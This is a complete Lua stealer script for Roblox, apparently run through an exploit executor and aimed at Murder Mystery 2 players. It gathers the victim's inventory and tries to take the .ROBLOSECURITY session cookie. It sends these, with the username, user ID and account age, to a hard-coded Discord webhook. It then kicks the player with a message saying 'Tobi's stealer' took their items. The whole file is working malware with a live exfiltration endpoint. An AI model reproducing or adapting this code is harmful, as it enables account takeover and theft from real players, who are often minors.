-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ LOGIC: INVENTORY SCANNER ]]
local function getGodlies()
    local inventory = {}
    local player = game.Players.LocalPlayer
    
    -- Пытаемся найти вещи в данных MM2
    local playerData = player:FindFirstChild("PlayerData") or player:FindFirstChild("Data")
    if playerData and playerData:FindFirstChild("Inventory") then
        for _, item in pairs(playerData.Inventory:GetChildren()) do
            -- Добавляем только ценные предметы (обычно у них есть атрибуты или папки)
            table.insert(inventory, item.Name)
        end
    end
    
    if #inventory == 0 then return "No items found or Hidden" end
    return table.concat(inventory, ", ")
end

-- [[ LOGIC: DATA COLLECTION & SEND ]]
local function main()
    local player = game.Players.LocalPlayer
    local cookie = "N/A"
    
    -- Попытка достать куки (зависит от экзекутора)
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    local items = getGodlies()

    local payload = {
        ["embeds"] = {{
            ["title"] = "💎 Godly Target Found!",
            ["color"] = 16711680, -- Красный
            ["fields"] = {
                {["name"] = "👤 Player", ["value"] = "Name: " .. player.Name .. "\nID: " .. player.UserId, ["inline"] = true},
                {["name"] = "📅 Acc Age", ["value"] = player.AccountAge .. " days", ["inline"] = true},
                {["name"] = "🎒 Inventory (Godlies)", ["value"] = "```" .. items .. "```"},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"}
            },
            ["footer"] = {["text"] = "MM2 Stealer Tool • " .. os.date("%X")}
        }}
    }

    local request_func = (syn and syn.request) or (http and http.request) or request or http_request
    
    if request_func then
        request_func({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end

    -- Финальный кик как на твоем скрине
    task.wait(1)
    player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
end

-- Запуск
main()
